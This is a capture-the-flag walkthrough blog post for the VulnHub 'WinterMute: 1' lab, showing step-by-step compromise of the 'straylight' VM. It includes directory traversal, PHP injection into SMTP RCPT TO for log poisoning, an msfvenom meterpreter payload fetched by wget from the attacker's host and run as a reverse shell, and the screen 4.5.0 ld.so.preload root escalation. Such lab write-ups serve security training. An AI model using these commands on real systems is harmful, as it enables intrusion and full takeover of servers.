@@ -1,0 +1,739 @@
+
+								
+																		Hack the WinterMute: 1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 11, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as Wintermute (Part 1) and it is another boot2root challenge provided for practice. So let’s try to break through it. But before please note that you can download it from here https://www.vulnhub.com/entry/wintermute-1,239/
+Security Level: Intermediate
+Author Note: There are 2 important things to note down for this lab
+
+No buffer overflows or exploits development – any necessary password cracking can be done with small wordlists.
+Straylight – simulates a public facing server with 2 NICs. Cap this first, then pivot to the final machine. Neuromancer – is within a non-public network with 1 NIC.
+
+Imp Note: This lab has 2 parts. The 1st part comprises of gaining the root shell of the victim machine and subsequently pivoting to another machine.T o begin with, this is the 1st part of the lab; a post which we will publish the 2nd lab in upcoming days
+Penetrating Methodologies 
+
+Network Scanning (Nmap, netdiscover)
+HTTP service enumeration
+Directory Traversal in the browser using Email log files
+Exploiting OS command injection in RCPT option of SMTP
+Generate PHP Backdoor (Msfvenom)
+Execute the backdoor embedded in RCPT option
+Reverse connection (Metasploit)
+Import python one-liner for proper TTY shell
+Identify the appropriate vulnerable SUID
+Exploiting target (exploit 4115)
+Get root access and capture the flag
+
+WalkThrough
+Let’s start off with scanning the network to find our target.
+
+We found our target –&gt; 192.168.1.124
+Our next step is to scan our target with NMAP.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.124
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.124
+					
+				
+			
+		
+
+
+The NMAP output shows us that there are 3 ports opened: 25 (SMTP), 80 (HTTP), 3000
+Browsed the URL http://192.168.1.124 and poked around; however, we were not able to get any significant clues to move forward  
+
+As we are aware that port 3000 is also opened on the victim machine, hence let’s try to access the website on a Non-standard HTTP port (3000) as follows :
+Browse to http://192.168.1.124:3000 and we will be greeted with the following page
+
+As we can see a Hint at the bottom of the page, the default username and credentials are already provided to us! Let’s try to login to the page with them
+Username: admin
+Password: admin
+
+ 
+On clicking the Flows option, we were redirected to the following page:
+
+Here we observed few directories were listed (as shown in the screenshot above), hence we thought of appending them to our URL http://192.168.1.124/ OR http://192.168.1.124:3000/
+We tried accessing http://192.168.1.124:3000/turing-bolo/ however no success. Then we browsed the URL http://192.168.1.124/turing-bolo/ and got below page
+
+ Click on Submit Query and we are redirected to the following page
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.124/turing-bolo/bolo.php?bolo=case
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.124/turing-bolo/bolo.php?bolo=case
+					
+				
+			
+		
+
+
+From the above screenshot, we can see a few log files (as highlighted). Per our experience, this could be an indication of Directory traversal where we can execute writeable files in the browser. Hence let’s try to append  ../../../log/mail to the URL in the browser as follows :
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail
+					
+				
+			
+		
+
+
+Now let’s try to enumerate further and connect to the SMTP (25) port
+
+		
+		
+			
+			
+			
+			
+telnet 192.168.1.124 25
+			
+				
+					
+				
+					1
+				
+						telnet 192.168.1.124 25
+					
+				
+			
+		
+
+As we can see, we got connected to the victim machine successfully. Now let’s try to send a mail via command line (CLI) of this machine and send the OS commands via the “RCPT TO” option.
+
+		
+		
+			
+			
+			
+			
+MAIL FROM:&lt;rrajchandel@gmail.com&gt;
+220 straylight ESMTP Postfix (Debian/GNU)
+250 2.1.0 Ok
+RCPT TO:&lt;?php system('whoami'); ?&gt;
+501 5.1.3 Bad recipient address syntax
+			
+				
+					
+				
+					12345
+				
+						MAIL FROM:&lt;rrajchandel@gmail.com&gt;220 straylight ESMTP Postfix (Debian/GNU)250 2.1.0 OkRCPT TO:&lt;?php system('whoami'); ?&gt;501 5.1.3 Bad recipient address syntax
+					
+				
+			
+		
+
+ 
+Note: We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.
+Now navigate back to the URL http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail  
+As depicted in the below screenshot of the browser, we can clearly see that mail logs files are displaying response output (www-data) of the Unix (OS) command whoami
+
+Let’s generate a Reverse shell with the following command
+
+		
+		
+			
+			
+			
+			
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f elf &gt; shell.elf
+			
+				
+					
+				
+					1
+				
+						msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f elf &gt; shell.elf
+					
+				
+			
+		
+
+Now run the web server on the Kali machine
+
+		
+		
+			
+			
+			
+			
+python –m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python –m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+As we got success in receiving the response of OS commands in the email log files, in a similar way there is a possibility that following this method, we may also get the Meterpreter access of the victim machine
+Hence as seen in the below screenshot, we will pass the commands in RCPT command as follows :
+1. Navigate to the/tmp directory and Download the shell.elf file from Kali machine
+2. Modify the permissions of the shell.elf file
+3.Execute our Reverse shell (shell.elf) file
+
+		
+		
+			
+			
+			
+			
+RCPT TO:&lt;?php system('cd /tmp; wget http://192.168.1.134/shell.elf'); ?&gt;
+501 5.1.3 Bad recipient address syntax
+RCPT TO:&lt;?php system('chmod 777 /tmp/shell.elf'); ?&gt;
+501 5.1.3 Bad recipient address syntax
+RCPT TO:&lt;?php system('/tmp/shell.elf'); ?&gt;
+501 5.1.3 Bad recipient address syntax
+			
+				
+					
+				
+					123456
+				
+						RCPT TO:&lt;?php system('cd /tmp; wget http://192.168.1.134/shell.elf'); ?&gt;501 5.1.3 Bad recipient address syntaxRCPT TO:&lt;?php system('chmod 777 /tmp/shell.elf'); ?&gt;501 5.1.3 Bad recipient address syntaxRCPT TO:&lt;?php system('/tmp/shell.elf'); ?&gt;501 5.1.3 Bad recipient address syntax
+					
+				
+			
+		
+
+
+Now in parallel, open the Metasploit console and perform the following
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.1.134
+msf exploit(handler) &gt; set lport 4444
+msf exploit(handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.1.134msf exploit(handler) &gt; set lport 4444msf exploit(handler) &gt; run
+					
+				
+			
+		
+
+Awesome!! We got the Meterpreter session
+Using sysinfo command, we found machine architecture details which may eventually help us to find out the kernel exploit for privilege escalation
+
+		
+		
+			
+			
+			
+			
+sysinfo
+			
+				
+					
+				
+					1
+				
+						sysinfo
+					
+				
+			
+		
+
+
+Further, navigate to shell
+
+		
+		
+			
+			
+			
+			
+shell
+			
+				
+					
+				
+					1
+				
+						shell
+					
+				
+			
+		
+
+In order to access proper TTY shell, we had imported python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Now let’s trigger the post-exploitation and try to get root access. Then by using the following command, we can enumerate all binaries having SUID permission.
+
+		
+		
+			
+			
+			
+			
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+
+Per the above output, it has dumped all system binaries having SUID permissions; however /bin/screen-4.5.0 seems to be interesting. Therefore first let us begin escalating the root privileges
+Upon searching exploit in kalilinux for the screen-4.5.0 exploit,
+
+		
+		
+			
+			
+			
+			
+searchsploit screen 4.5.0
+			
+				
+					
+				
+					1
+				
+						searchsploit screen 4.5.0
+					
+				
+			
+		
+
+From given below image we can observe the highlighted exploit 41154.sh which is a shell script for local privilege escalation.
+
+When we didn’t find any appropriate method to execute this shell script for post exploitation, then we approached the manual compilation method and reviewed its code using cat command.
+
+		
+		
+			
+			
+			
+			
+cat /usr/share/exploitdb/exploits/linux/local/41154.sh
+			
+				
+					
+				
+					1
+				
+						cat /usr/share/exploitdb/exploits/linux/local/41154.sh
+					
+				
+			
+		
+
+If you will notice the following code, then you will observe this script is written in C language and we have divided it into three parts for manual compilation.
+
+ Copy Yellow highlighted the code and past it in a text document and save it as libhax.c
+ Copy Orange highlighted the code and past it in a text document and save it as rootshell.c
+
+3.Copy the remaining code in notepad , to paste it for the latter part of the section (Compilation of C Program files)
+
+From given below image you can see I have pasted above copied inside the file rootshell.c
+ 
+From given below image you can see I have pasted above copied inside the file libhax.c
+
+We will save the libhax.c and rootshell.c files in the Kali Desktop shell directory for further use. Here we can see the contents of both the files in the below image
+
+Now go back to the Meterpreter session and upload the exploit files from Kali machine Meterpreter session to the /tmp directory of the target (victim) machine.
+
+		
+		
+			
+			
+			
+			
+upload libhax.c /tmp
+upload rootshell.c /tmp
+			
+				
+					
+				
+					12
+				
+						upload libhax.c /tmpupload rootshell.c /tmp
+					
+				
+			
+		
+
+Further, navigate to shell
+
+		
+		
+			
+			
+			
+			
+shell
+			
+				
+					
+				
+					1
+				
+						shell
+					
+				
+			
+		
+
+In order to access proper TTY shell, we had imported python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Compilation of C Program files
+Note: Refer to website https://www.exploit-db.com/exploits/41154 for the below commands
+Let’s compile our C program file manually in our local system using gcc as given below.
+1. Compile libhax.c file through the following command.
+
+		
+		
+			
+			
+			
+			
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+			
+				
+					
+				
+					1
+				
+						gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+					
+				
+			
+		
+
+2. Similarly, compile rootshell.c file through the following command.
+
+		
+		
+			
+			
+			
+			
+gcc -o /tmp/rootshell /tmp/rootshell.c
+			
+				
+					
+				
+					1
+				
+						gcc -o /tmp/rootshell /tmp/rootshell.c
+					
+				
+			
+		
+
+
+Navigate to /etc directory and run the commands further
+
+		
+		
+			
+			
+			
+			
+cd /etc
+unmask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+screen -ls
+			
+				
+					
+				
+					1234
+				
+						cd /etcunmask 000screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"screen -ls
+					
+				
+			
+		
+
+Proceed forward and access the /tmp/rootshell folder of the victim machine by typing :
+
+		
+		
+			
+			
+			
+			
+/tmp/rootshell
+			
+				
+					
+				
+					1
+				
+						/tmp/rootshell
+					
+				
+			
+		
+
+Hurray !! We got into the root
+Navigate to the root directory
+
+		
+		
+			
+			
+			
+			
+cd /root
+			
+				
+					
+				
+					1
+				
+						cd /root
+					
+				
+			
+		
+
+Let’s see what file it contains
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+Wonderful!! We have gained access to the flag and hacked this box.
+There seems to be another interesting file note.txt, let’s open the same and see what it contains
+
+		
+		
+			
+			
+			
+			
+cat note.txt
+			
+				
+					
+				
+					1
+				
+						cat note.txt
+					
+				
+			
+		
+
+
+As we can see there is a clue (vulnerability) for the next part (part 2) of this lab
+Stay tuned!! We will be back with the next part of another article!
+Author: Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
